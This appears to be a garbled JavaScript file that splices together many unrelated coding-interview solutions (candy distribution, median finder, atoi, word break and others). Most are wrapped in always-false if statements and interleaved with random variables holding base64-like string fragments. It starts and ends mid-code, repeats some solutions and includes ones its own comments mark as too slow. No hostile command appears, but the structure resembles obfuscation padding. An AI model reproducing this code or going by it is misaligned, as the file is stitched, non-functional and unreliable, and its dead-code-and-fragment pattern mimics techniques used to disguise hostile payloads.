There are N children standing in a line. Each child is assigned a rating value.

You are giving candies to these children subjected to the following requirements:

Each child must have at least one candy.
Children with a higher rating get more candies than their neighbors.
What is the minimum candies you must give?
*/

//TLE
/**
 * @param {number[]} ratings
 * @return {number}
 */
var candy = function(ratings) {
    let len = ratings.length;
    let candies = [];
    let sum = 1;
    
    candies[0] = 1;
    
    for (let i = 1; i < len; i++) {
        if (ratings[i] <= ratings[i - 1]) {
            if (candies[i - 1] > 1) {
                candies[i] = 1;
                sum++;
            } else {
                candies[i] = 1;
                sum++;
                let k = i;
                
                while (k > 0 && (ratings[k] < ratings[k - 1]) && (candies[k - 1] <= candies[k])) {
                    candies[k - 1]++;
                    sum++;
                    k--;
                }
                
                
            }
        } else {
            candies[i] = candies[i - 1] + 1;
            sum += candies[i];
        }
    }
    
    return sum;
};

}

    var ukkvptkbjsex = 'DemYQCftiT';
    var pvowpm = 'bVZ6Z';
    var kscyhclas = 'LaGgcBpDXq';
    var feqnblxnt = 'EhKcFk';
    var ubajxjz = 'pWjMe';
    var pusvgseyynhbk = 'zUmxaRXR';
    var nvkyhrqnyww = 'ycCiivoT';
if (0.04 && false) {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var fgdijikedquiwal = 'sZVhNZ1BT';
if (5 === 16) {
    /**
Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value.

Examples: 
[2,3,4] , the median is 3

[2,3], the median is (2 + 3) / 2 = 2.5

Design a data structure that supports the following two operations:

void addNum(int num) - Add a integer number from the data stream to the data structure.
double findMedian() - Return the median of all elements so far.
For example:

add(1)
add(2)
findMedian() -> 1.5
add(3) 
findMedian() -> 2
*/

// SOLUTION 1: use a max heap and min heap
// java solution
/**
class MedianFinder {

    private Queue<Long> small = new PriorityQueue(),
                        large = new PriorityQueue();

    public void addNum(int num) {
        large.add((long) num);
        small.add(-large.poll());
        if (large.size() < small.size())
            large.add(-small.poll());
    }

    public double findMedian() {
        return large.size() > small.size()
               ? large.peek()
               : (large.peek() - small.peek()) / 2.0;
    }
};
*/

// SOLUTION 2: BST
/**
 * My BST node, has extra attribute initialized as 0
 */
class BSTNode {
    constructor (val) {
        this.val = val;
        this.left = null;
        this.right = null;
        this.size = 1;
    }
}

class BST {
    constructor() {
        this.root = null;
    }
    
    add(val, node) {
        if (!node) {
            this.root = new BSTNode(val);
            return;
        }
        
        if (val > node.val) {
            if (node.right) {
                this.add(val, node.right);
            } else {
                node.right = new BSTNode(val);
            }
        } else {
            if (node.left) {
                this.add(val, node.left);
            } else {
                node.left = new BSTNode(val);
            }
        }
        
        node.size++;
    }
    
    rank(k) {
        let node = this.root;
        
        while(true) {
            const leftSize = node.left ? node.left.size : 0;
            
            if (leftSize === k) {
                return node.val;
            }
            
            if (leftSize > k) {
                node = node.left;
            } else {
                node = node.right;
                k = k - leftSize - 1;
            }
        }
    }
}

/**
 * @constructor
 */
var MedianFinder = function() {
    this.BST = new BST();
};

/**
 * @param {integer} word
 * @return {void}
 * Adds a num into the data structure.
 */
MedianFinder.prototype.addNum = function(num) {
    this.BST.add(num, this.BST.root);
};

/**
 * @return {double}
 * Return median of current data stream
 */
MedianFinder.prototype.findMedian = function() {
    const size = this.BST.root.size;
    
    if (size % 2 === 0) {
        return (this.BST.rank(size / 2) + this.BST.rank(size / 2 - 1)) / 2;
    }
    
    return this.BST.rank(parseInt(size / 2));
};

/**
 * Your MedianFinder object will be instantiated and called as such:
 * var mf = new MedianFinder();
 * mf.addNum(1);
 * mf.findMedian();
 */

}

    var gkgrcuvrpnn = 'BWYXGoRjUR';
    var jgcvzcwmoiby = 'QmJDaUFnS';
if (84 > 175) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions:

You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).
After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day)
Example:

prices = [1, 2, 3, 0, 2]
maxProfit = 3
transactions = [buy, sell, cooldown, buy, sell]
*/
/**
 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var len = prices.length,
        buy = [],
        sell = [],
        i;
    
    if (len < 2) {
        return 0;
    }
    
    // buy[i] 是指在第i天手上持有股票的最大收益
    // sell[i] 是指在第i天手上没有股票的最大收益
    buy[0] = 0 - prices[0];
    buy[1] = Math.max(0 - prices[0], 0 - prices[1]);
    sell[0] = 0;
    sell[1] = Math.max(0, buy[0] + prices[1]);
    
    for (i = 2; i < len; i++) {
        buy[i] = Math.max(buy[i - 1], sell[i - 2] - prices[i]);
        sell[i] = Math.max(sell[i - 1], buy[i - 1] + prices[i]);
    }
    
    return sell[len - 1];
};

}

    var lxgxtccdorp = 'AqCcR';
    var vfsapwtcnkpznzq = 'UNBZ';
if (!true && 0) {
    /**
Given a sorted array of integers, find the starting and ending position of a given target value.

Your algorithm's runtime complexity must be in the order of O(log n).

If the target is not found in the array, return [-1, -1].

For example,
Given [5, 7, 7, 8, 8, 10] and target value 8,
return [3, 4].


*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[]}
 */
var searchRange = function(nums, target) {
    var result = [],
        leftIndex = findLeftMost(target, nums),
        rightIndex = findRightMost(target, nums);
    
    result.push(leftIndex);    
    result.push(rightIndex);
    
    return result;
};

function findLeftMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            end = mid - 1;
        }
    }
    
    if (start >= 0 && start < len && nums[start] === target) {
        return start;
    }
    
    return -1;
}

function findRightMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            start = mid + 1;
        }
    }
    
    if (end >= 0 && end < len && nums[end] === target) {
        return end;
    }
    
    return -1;
}

}

    var rgbilezwlap = 'lMXYZ';
if ('x' === 'M') {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:
Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
sumRegion(1, 1, 2, 2) -> 11
sumRegion(1, 2, 2, 4) -> 12
Note:
You may assume that the matrix does not change.
There are many calls to sumRegion function.
You may assume that row1 ≤ row2 and col1 ≤ col2.
*/

 /**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    var sum = [],
        rLen = matrix.length,
        cLen,
        i,
        j;
    
    if (rLen === 0) {
        this.sum = null;
        return;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        sum.push(new Array(cLen));
    }    
    
    sum[0][0] = matrix[0][0];
    
    for (i = 1; i < rLen; i++) {
        sum[i][0] = sum[i - 1][0] + matrix[i][0];
    }
    
    for (j = 1; j < cLen; j++) {
        sum[0][j] = sum[0][j - 1] + matrix[0][j];
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            sum[i][j] = sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1] + matrix[i][j];
        }
    }
    
    this.sum = sum;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    if (!this.sum) {
        return 0;
    }
    
    var result = this.sum[row2][col2];
    
    if (row1 > 0) {
        result -= this.sum[row1 - 1][col2];
    }
    
    if (col1 > 0) {
        result -= this.sum[row2][col1 - 1];
    }
    
    if (row1 > 0 && col1 > 0) {
        result += this.sum[row1 - 1][col1 - 1];
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var yidaoysyh = '0lDQWdleUJ';
    var akscvwejehor = 'kKaq';
if (Array.isArray(4)) {
    /**
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.


 * @constructor
 */
var MinStack = function() {
    this.min = [];
    this.arr = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
MinStack.prototype.push = function(x) {
    var len = this.min.length;
    if (this.arr.length === 0) {
        this.min.push(x);
    } else if (this.min[len - 1] >= x) {
        this.min.push(x);
    }
    this.arr.push(x);
};

/**
 * @returns {void}
 */
MinStack.prototype.pop = function() {
    var elem,
        len = this.min.length;
    if (this.arr.length > 0) {
        elem = this.arr.pop();
    }
    if (elem === this.min[len - 1]) {
        this.min.pop();   
    }
};

/**
 * @returns {number}
 */
MinStack.prototype.top = function() {
    var len = this.arr.length;
    if (len > 0) {
        return this.arr[len - 1];
    }
    
};

/**
 * @returns {number}
 */
MinStack.prototype.getMin = function() {
    var len = this.min.length;
    return this.min[len - 1];
};

}

    var nhvciv = 'yWlhs';
    var xmudtermxks = 'pwyQBDD';
if (89 > 123) {
    /**
Given an unsorted integer array, find the first missing positive integer.

For example,
Given [1,2,0] return 3,
and [3,4,-1,1] return 2.

Your algorithm should run in O(n) time and uses constant space.

 * @param {number[]} nums
 * @return {number}
 */
var firstMissingPositive = function(nums) {
    var len = nums.length,
        temp,
        i;
    
    for (i = 0 ; i < len; i++) {
        while (nums[i] !== i + 1) {
            if (nums[i] > len || nums[i] < 1 || nums[i] === nums[nums[i] - 1]) {
                break;
            }
            temp = nums[nums[i] - 1];
            nums[nums[i] - 1] = nums[i];
            nums[i] = temp;
        }
    }
    
    for(i = 0; i < len; i++) {
        if (nums[i] !== i + 1) {
            return i + 1;
        }
    }
    return len + 1;
};

}

    var voodx = 'RGIyU';
if (63 > 138) {
    /**
Follow up for H-Index: What if the citations array is sorted in ascending order? Could you optimize your algorithm?

Hint:

Expected runtime complexity is in O(log n) and the input is sorted.
*/
/**
 * @param {number[]} citations
 * @return {number}
 */
var hIndex = function(citations) {
    var len = citations.length,
        start = 0,
        end = len - 1,
        mid;
    
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        
        if (citations[mid] === len - mid) {
            return len - mid;
        }
        
        if (citations[mid] > len - mid) {
            end = mid - 1;
        } else {
            start = mid + 1;
        }
    }
    
    return len - start;
};

}

    var opfmxtj = 'TjuDD';
if (null === 2) {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var tesqjtbyh = 'mxPaUF4T';
    var ehknnwqek = 'rsgKX';
if (4 instanceof String) {
    /**
Implement atoi to convert a string to an integer.

Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.

Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.

Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button  to reset your code definition.

spoilers alert... click to show requirements for atoi.

Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.

The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.

If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.

If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.

*/
/**
 * @param {string} str
 * @return {number}
 */
var myAtoi = function(str) {
    var len = str.length,
        isNegative = null,
        result = 0,
        numberStarted = false,
        cur,
        i;
        
    for (i = 0; i < len; i++) {
        if (str.charAt(i) === ' ') {
            if (!numberStarted) {
                continue;
            } else {
                return getResult(isNegative, result);
            }
        }
        
        if (isNegative === null) {
            if (str.charAt(i) === '-') {
                isNegative = true;
                numberStarted = true;
                continue;
            } else if (str.charAt(i) === '+') {
                isNegative = false;
                numberStarted = true;
                continue;
            }
        }
        
        cur = parseInt(str.charAt(i));
        
        if (!isNaN(cur)) {
            result = result*10 + cur;
            
            if (!numberStarted) {
                numberStarted = true;
            }
        } else {
            return getResult(isNegative, result);
        }
    }
    
    return getResult(isNegative, result);
};
// :(
function getResult(isNegative, result) {
    result = isNegative? result * (-1) : result;
    
    if (result > 2147483647) {
        result = 2147483647;
    } else if (result < -2147483648) {
        result = -2147483648;
    }
    
    return result;
}

}

    var yricgxmdqkuf = 'WpNZ';
    var fxhtrfx = 'uTCPtn';
    var qbhlqcheqaae = '2ZTd2';
    var uiqkld = 'eDaXIjq';
    var fdnyfxaqvacpv = 'dMeThnUmpF';
    var lvarfx = 'TwKW';
if ('false' === true) {
    /**
Given a positive integer, return its corresponding column title as appear in an Excel sheet.

For example:

    1 -> A
    2 -> B
    3 -> C
    ...
    26 -> Z
    27 -> AA
    28 -> AB 
*/
/**
 * @param {number} n
 * @return {string}
 */
var convertToTitle = function(n) {
    var result = '',
        cur;
    
    //97 is the ASCII code for lower case 'a'. If you want uppercase letters, replace 97 with 65 (uppercase 'A'). 
    
    while (n > 0) {
        cur = (n - 1) % 26;
        result = String.fromCharCode(65 + cur) + result;
        n = Math.floor((n - 1) / 26);
    }
    
    return result;
};

}

    var cugpqmrvcfk = 'eUNpQWd';
    var vszudeea = 'LNMzZwHG';
    var bmfemu = 'JQ0F';
if (!true && 1) {
    /**
Additive number is a string whose digits can form additive sequence.

A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two.

For example:
"112358" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8.

1 + 1 = 2, 1 + 2 = 3, 2 + 3 = 5, 3 + 5 = 8
"199100199" is also an additive number, the additive sequence is: 1, 99, 100, 199.
1 + 99 = 100, 99 + 100 = 199
Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid.

Given a string containing only digits '0'-'9', write a function to determine if it's an additive number.

Follow up:
How would you handle overflow for very large input integers?
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isAdditiveNumber = function(num) {
    var len = num.length,
        i,
        j;
        
    for (i = 1; i <= len / 2; i++) {
        for (j = 1; j <= len / 2; j++) {
            if (canBeAdded(num.substr(0, i), num.substr(i, j), num.substr(i + j))) {
                return true;
            }
        }
    }
    
    return false;
};

function canBeAdded(a, b, c) {
    if ((a.length > 1 && a.charAt(0) === '0') || (b.length > 1 && b.charAt(0) === '0') || (c.length >= 1 && c.charAt(0) === '0')) {
        return false;
    }
    
    var aNum = parseInt(a),
        bNum = parseInt(b),
        sum = aNum + bNum + '';
        
    if (c === sum) {
        return true;
    }
    
    if (c.substr(0, sum.length) !== sum) {
        return false;
    }
    
    return canBeAdded(b, sum, c.substr(sum.length));
}

}

    var ztygbrjaqw = 'YsRh';
if (9 instanceof String) {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var wnalwhd = 'nSUNBZ';
if (Array.isArray(5)) {
    /**
Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results.

Note: The input string may contain letters other than the parentheses ( and ).

Examples:
"()())()" -> ["()()()", "(())()"]
"(a)())()" -> ["(a)()()", "(a())()"]
")(" -> [""]

*/
/**
 * @param {string} s
 * @return {string[]}
 */
var removeInvalidParentheses = function(s) {
    var result = [];
    
    dfs(result, s, '', 0, 0);
    
    if (result.length === 0) {
        result.push('');
    }
    
    return result;
};

var max = 0; // max is to make sure we're removing the minimum number of parentheses

function dfs(result, str, curStr, leftCount, leftAccumulated) {
    if (str.length === 0) {
        if (curStr.length > 0 && leftCount === 0) {
            if (max < leftAccumulated) {
                max = leftAccumulated;
            }
            
            if (max === leftAccumulated && result.indexOf(curStr) === -1) {
                result.push(curStr);
            }
        }
        
        return;
    }
    
    var char = str.charAt(0);
    
    if (char === '(') {
        // keep (
        dfs(result, str.substr(1), curStr + '(', leftCount + 1, leftAccumulated + 1);
        // not keep (
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else if (char === ')') {
        if (leftCount > 0) {
            dfs(result, str.substr(1), curStr + ')', leftCount - 1, leftAccumulated);
        }
        
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else {
        dfs(result, str.substr(1), curStr + char, leftCount, leftAccumulated);
    }
}

}

    var fnrpcyhlee = 'WPGKYiaKug';
if (2 instanceof String) {
    /**
Write an algorithm to determine if a number is "happy".

A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.

Example: 19 is a happy number

12 + 92 = 82
82 + 22 = 68
62 + 82 = 100
12 + 02 + 02 = 1

 * @param {number} n
 * @return {boolean}
 */
var isHappy = function(n) {
    var cur = n,
        num,
        i,
        len,
        result = [],
        sum = 0,
        sums = [];
    while (true) {
        while (cur !== 0) {
            num = cur%10;
            result.push(num);
            cur = (cur - num)/10;
        }
        len = result.length;
        for(i = 0; i < len; i++) {
            sum += Math.pow(result[i], 2);
        }
        if (sum === 1) {
            return true;
        } else {
            if (sums.indexOf(sum) !== -1) {
                return false;
            } else {
                sums.push(sum);
                result = [];
                cur = sum;
                sum = 0;
            }
        }
    }
};

}

    var awiniu = '2V5QmpkSEp';
if ('false' === true) {
    /**
Given a string of numbers and operators, return all possible results from computing all the different possible ways to group numbers and operators. The valid operators are +, - and *.


Example 1
Input: "2-1-1".

((2-1)-1) = 0
(2-(1-1)) = 2
Output: [0, 2]


Example 2
Input: "2*3-4*5"

(2*(3-(4*5))) = -34
((2*3)-(4*5)) = -14
((2*(3-4))*5) = -10
(2*((3-4)*5)) = -10
(((2*3)-4)*5) = 10
Output: [-34, -14, -10, -10, 10]
*/
/**
 * @param {string} input
 * @return {number[]}
 */
var diffWaysToCompute = function(input) {
    var len = input.length,
        result = [],
        left,
        right,
        curChar,
        i,
        j,
        k;
    
    for (i = 0; i < len; i++) {
        curChar = input.charAt(i);
        
        if (curChar === '+' || curChar === '-' || curChar === '*') {
            left = diffWaysToCompute(input.substring(0, i));
            right = diffWaysToCompute(input.substring(i + 1));
            
            for (j = 0; j < left.length; j++) {
                for (k = 0; k < right.length; k++) {
                    if (curChar === '+') {
                        result.push(left[j] + right[k]);
                    } else if (curChar === '-') {
                        result.push(left[j] - right[k]);
                    } else {
                        result.push(left[j] * right[k]);
                    }
                }
            }
        }
    }
    
    if (result.length === 0) {
        result.push(parseInt(input));
    }
    
    return result;
};

}

    var cdskgztz = 'HJJzvolwIz';
    var kxjxucnefei = 'zT2lCMGNu';
    var bdropb = 'eRPkR';
// script constant async code loop await constant zatvpnyy loop number debug return return constant
if (0.51 && false) {
    /**
Given a string s and a dictionary of words dict, add spaces in s to construct a sentence where each word is a valid dictionary word.

Return all such possible sentences.

For example, given
s = "catsanddog",
dict = ["cat", "cats", "and", "sand", "dog"].

A solution is ["cats and dog", "cat sand dog"].


*/
// Time limit exceeded...
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    const len = s.length;
    let hasSeg = [];
    let result = [];
    let i, j;
    
    for (i = 0; i <= len; i++) {
        hasSeg.push(new Array(len + 1).fill(false));    
    }
    
    hasSeg[0][0] = true;
    
    for (i = 0; i <= len; i++) {
        for (j = i; j >= 0; j--) {
            if (wordDict.has(s.slice(j, i))) {
                hasSeg[j][i] = true;
            } else {
                for (let k = j; k < i; k++) {
                    if (hasSeg[j][k] && hasSeg[k][i]) {
                        hasSeg[j][i] = true;
                        break;
                    }
                }
            }
        }
    }
    
    helper(result, [], 0, s, wordDict, hasSeg);
    
    return result;
};

function helper(result, curArr, startIndex, s, wordDict, hasSeg) {
    if (startIndex === s.length) {
        result.push(curArr.join(' '));
    }
    
    for (let i = startIndex; i <= s.length; i++) {
        if (hasSeg[startIndex][i]) {
            if (wordDict.has(s.slice(startIndex, i))) {
                curArr.push(s.slice(startIndex, i));
                helper(result, curArr.concat(), i, s, wordDict, hasSeg);
                curArr.pop();
            }
        }
    }
}

// Memory limit exceeded
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    let map = {};
    
    return helper(map, s, wordDict);
};

function helper(map, s, wordDict) {
    if (map.hasOwnProperty(s)) {
        return map[s];
    }
    
    let result = [];
    
    if (s.length === 0) {
        result.push('');
        return result;
    }
    
    wordDict.forEach(word => {
        if (s.startsWith(word)) {
            let subArr = helper(map, s.slice(word.length), wordDict);
            
            result.push((word + ' ' +  subArr.join(' ')).trim());
        }
    });
    
    map[s] = result;
    return result;
}

}

    var krezarvzpfjl = 'KEheyJufq';
if (0.62 && false) {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

    var kilijwgx = 'Vmx';
    var cwvsfos = 'lcdYnMNKdS';
if (null === 4) {
    /**
Follow up for "Search in Rotated Sorted Array":
What if duplicates are allowed?

Would this affect the run-time complexity? How and why?

Write a function to determine if a given target is in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {boolean}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] === target) {
            return true;
        }
        
        if (nums[mid] < nums[end]) { // right half sorted
            if (nums[mid] < target && nums[end] >= target) {
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        } else if (nums[mid] > nums[end]) { // left half sorted
            if (nums[mid] > target && nums[start] <= target) {
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // don't know which half is sorted
            end--;
        }
    }
    
    return false;
};

}

    var isscswlbetcdr = 'MQ0JyWl';
    var oqrjwv = 'TgmfZHKDz';
    var fovyryb = 'hsRG';
if (0.05 && false) {
    /**
 * Given an array of size n, find the majority element. The majority element is the element that appears more than ⌊ n/2 ⌋ times.
 * You may assume that the array is non-empty and the majority element always exist in the array.
 * 
 * @param {number[]} num
 * @return {number}
 */
var majorityElement = function(num) {
    var i,
        length = num.length,
        max,
        list = {};
    if (length === 1) {
        return num[0];
    }
    for (i = 0; i < length; i++) {
        if (list[num[i]]) {
            max = ++list[num[i]];
            if (i > length/2 - 1 && max >= length/2) {
                return num[i];
            }
        } else {
            list[num[i]] = 1;
        }
    }
    
};

// SOLUTION 2: voting
var majorityElement = function(num) {
    var candidate,
        length = num.length,
        count = 1,
        i;
        
    candidate = num[0];
    
    for (i = 1; i < length; i++) {
        if (count === 0 || num[i] === candidate) {
            count++;
            candidate = num[i];
        } else {
            count--;
        }
    }
    
    return candidate;
};

}

    var fyhthdziepzv = 'buZMRNsaTu';
if (typeof navigator === 'undefined') {
    /**
You are climbing a stair case. It takes n steps to reach to the top.

Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 * @param {number} n
 * @return {number}
 */
var climbStairs = function(n) {
    var arr = [],
        i;
    
